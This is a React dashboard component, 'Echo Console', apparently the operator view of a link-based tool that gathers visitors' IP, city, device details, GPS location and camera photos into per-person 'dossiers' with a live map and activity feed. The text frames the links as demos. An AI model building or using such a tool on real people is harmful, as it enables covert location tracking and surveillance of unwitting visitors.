import { useEffect, useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import { api } from "../lib/api";
import { getSocket, resetSocket } from "../lib/socket";
import { adminEmail, clearToken } from "../lib/auth";
import type { FeedLine, Visitor } from "../lib/types";
import MapPanel from "../components/MapPanel";

const KIND_COLOR: Record<string, string> = {
  open: "bg-accent",
  device: "bg-accent2",
  geo: "bg-warn",
  prompt: "bg-warn",
  media: "bg-good",
  reveal: "bg-accent",
  delete: "bg-bad",
};

function timeAgo(iso?: string) {
  if (!iso) return "";
  const s = Math.max(0, (Date.now() - new Date(iso).getTime()) / 1000);
  if (s < 60) return `${Math.floor(s)}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  return `${Math.floor(s / 3600)}h ago`;
}

export default function Dashboard() {
  const nav = useNavigate();
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [feed, setFeed] = useState<FeedLine[]>([]);
  const [tab, setTab] = useState<"map" | "gallery">("map");

  useEffect(() => {
    api("/api/sessions")
      .then(setVisitors)
      .catch(() => {});
    const s = getSocket();
    const onUpdate = (v: Visitor) =>
      setVisitors((prev) => {
        const i = prev.findIndex((x) => x.token === v.token);
        if (i >= 0) {
          const c = [...prev];
          c[i] = v;
          return c;
        }
        return [v, ...prev];
      });
    const onRemoved = ({ token }: { token: string }) =>
      setVisitors((prev) => prev.filter((v) => v.token !== token));
    const onFeed = (l: FeedLine) =>
      setFeed((prev) => [l, ...prev].slice(0, 80));
    s.on("visitor:update", onUpdate);
    s.on("visitor:removed", onRemoved);
    s.on("feed:line", onFeed);
    return () => {
      s.off("visitor:update", onUpdate);
      s.off("visitor:removed", onRemoved);
      s.off("feed:line", onFeed);
    };
  }, []);

  const points = visitors.reduce((a, v) => a + (v.points || 0), 0);
  const mediaCount = visitors.reduce(
    (a, v) => a + (v.media?.length || 0),
    0
  );
  const gpsCount = visitors.filter((v) => v.geo?.method === "gps").length;
  const latest = visitors[0];
  const photos = visitors
    .flatMap((v) =>
      (v.media || [])
        .filter((m) => m.kind === "photo")
        .map((m) => ({ ...m, token: v.token, city: v.ip?.city }))
    )
    .slice(0, 12);

  return (
    <div className="min-h-screen bg-ink">
      <header className="sticky top-0 z-20 border-b border-white/5 bg-ink/90 backdrop-blur">
        <div className="mx-auto flex max-w-7xl items-center justify-between px-6 py-4">
          <div className="flex items-center gap-4">
            <Link to="/" className="flex items-center gap-2.5">
              <span className="h-7 w-7 rounded-lg border border-accent/40 grid place-items-center">
                <span className="h-2.5 w-2.5 rounded-full bg-accent" />
              </span>
              <span className="font-display font-semibold text-white">
                Echo Console
              </span>
            </Link>
            <span className="flex items-center gap-1.5 rounded-full border border-good/30 bg-good/10 px-2.5 py-1 text-[11px] font-medium text-good">
              <span className="h-1.5 w-1.5 rounded-full bg-good animate-pulse-dot" />
              LIVE
            </span>
          </div>
          <nav className="flex items-center gap-3 text-sm">
            <Link
              to="/dashboard/sessions"
              className="rounded-lg glass px-4 py-2 text-slate-200 hover:border-accent/40 transition"
            >
              All sessions
            </Link>
            <span className="hidden text-xs text-slate-500 sm:inline">
              {adminEmail()}
            </span>
            <button
              onClick={() => {
                clearToken();
                resetSocket();
                nav("/login");
              }}
              className="rounded-lg border border-white/10 px-4 py-2 text-slate-300 transition hover:border-bad/40 hover:text-bad"
            >
              Sign out
            </button>
            <Link to="/" className="text-slate-500 hover:text-white transition">
              Landing
            </Link>
          </nav>
        </div>
      </header>

      <div className="mx-auto max-w-7xl px-6 py-6">
        <div className="grid grid-cols-2 gap-3 md:grid-cols-4">
          {[
            { label: "sessions", value: visitors.length, color: "text-white" },
            { label: "data points", value: points, color: "text-accent" },
            { label: "gps locks", value: gpsCount, color: "text-warn" },
            { label: "media files", value: mediaCount, color: "text-good" },
          ].map((k, i) => (
            <div
              key={k.label}
              className="glass rounded-2xl p-4 animate-rise"
              style={{ animationDelay: `${i * 60}ms` }}
            >
              <div className={`font-display text-3xl font-bold ${k.color}`}>
                {k.value}
              </div>
              <div className="mt-1 text-xs tracking-wider text-slate-500 uppercase">
                {k.label}
              </div>
            </div>
          ))}
        </div>

        <div className="mt-4 flex gap-2">
          {(["map", "gallery"] as const).map((t) => (
            <button
              key={t}
              onClick={() => setTab(t)}
              className={`rounded-lg px-4 py-2 text-sm transition ${
                tab === t
                  ? "bg-accent/15 text-accent border border-accent/30"
                  : "text-slate-500 hover:text-slate-300 border border-transparent"
              }`}
            >
              {t === "map" ? "Live map" : "Media gallery"}
            </button>
          ))}
        </div>

        <div className="mt-4 grid gap-4 lg:grid-cols-3">
          <div className="lg:col-span-2">
            {tab === "map" ? (
              <div className="glass overflow-hidden rounded-2xl">
                <MapPanel
                  visitors={visitors}
                  className="h-[420px] w-full"
                />
              </div>
            ) : (
              <div className="glass rounded-2xl p-4">
                {photos.length === 0 ? (
                  <div className="grid h-[420px] place-items-center text-sm text-slate-500">
                    no media captured yet — open a demo link and allow the camera
                  </div>
                ) : (
                  <div className="grid grid-cols-3 gap-3 md:grid-cols-4">
                    {photos.map((p, i) => (
                      <Link
                        key={i}
                        to={`/dashboard/sessions/${p.token}`}
                        className="group relative aspect-square overflow-hidden rounded-xl border border-white/10"
                      >
                        <img
                          src={p.url}
                          alt=""
                          className="h-full w-full object-cover transition group-hover:scale-105"
                        />
                        <span className="absolute right-0 bottom-0 left-0 bg-gradient-to-t from-black/80 to-transparent px-2 py-1.5 text-[11px] text-slate-300">
                          {p.city || p.token}
                        </span>
                      </Link>
                    ))}
                  </div>
                )}
              </div>
            )}

            {latest && (
              <div className="glass mt-4 flex items-center gap-5 rounded-2xl p-5 animate-rise">
                {latest.media?.find((m) => m.kind === "photo") ? (
                  <img
                    src={latest.media.find((m) => m.kind === "photo")!.url}
                    alt=""
                    className="h-20 w-20 rounded-xl border border-white/10 object-cover"
                  />
                ) : (
                  <div className="grid h-20 w-20 place-items-center rounded-xl bg-white/5 text-2xl text-slate-600">
                    ◎
                  </div>
                )}
                <div className="min-w-0 flex-1">
                  <div className="flex items-center gap-2 text-xs text-slate-500">
                    <span className="h-1.5 w-1.5 rounded-full bg-good animate-pulse-dot" />
                    latest visitor · {timeAgo(latest.startedAt || latest.createdAt)}
                  </div>
                  <div className="font-display truncate text-lg font-semibold text-white">
                    {latest.ip?.city || "unknown city"} · {latest.ip?.addr}
                  </div>
                  <div className="truncate text-sm text-slate-400">
                    {[latest.device?.device, latest.device?.os, latest.device?.browser]
                      .filter(Boolean)
                      .join(" · ") || "device pending"}{" "}
                    ·{" "}
                    {latest.geo?.method === "gps"
                      ? `GPS ±${Math.round(latest.geo.accuracy || 0)}m`
                      : "IP-level"}
                    {" · "}
                    <b className="text-accent">{latest.points}</b> points
                  </div>
                </div>
                <Link
                  to={`/dashboard/sessions/${latest.token}`}
                  className="shrink-0 rounded-xl bg-accent/15 px-4 py-2.5 text-sm font-semibold text-accent transition hover:bg-accent/25"
                >
                  dossier →
                </Link>
              </div>
            )}
          </div>

          <div className="glass flex h-[560px] flex-col rounded-2xl p-5">
            <div className="flex items-center justify-between">
              <span className="font-display text-sm font-semibold text-white tracking-wide">
                ACTIVITY FEED
              </span>
              <span className="text-xs text-slate-600">{feed.length} events</span>
            </div>
            <div className="mt-4 flex-1 space-y-2.5 overflow-y-auto pr-1">
              {feed.length === 0 && (
                <p className="text-sm text-slate-600">
                  waiting for visitors… generate a link and open it to see events
                  stream in here.
                </p>
              )}
              {feed.map((l, i) => (
                <div
                  key={i}
                  className="flex items-start gap-2.5 rounded-lg border border-white/5 bg-white/[0.02] px-3 py-2.5 animate-rise"
                >
                  <span
                    className={`mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full ${
                      KIND_COLOR[l.kind] || "bg-slate-500"
                    }`}
                  />
                  <div className="min-w-0">
                    <div className="truncate text-sm text-slate-300">{l.text}</div>
                    <div className="text-[11px] text-slate-600">
                      {new Date(l.at).toLocaleTimeString()}
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
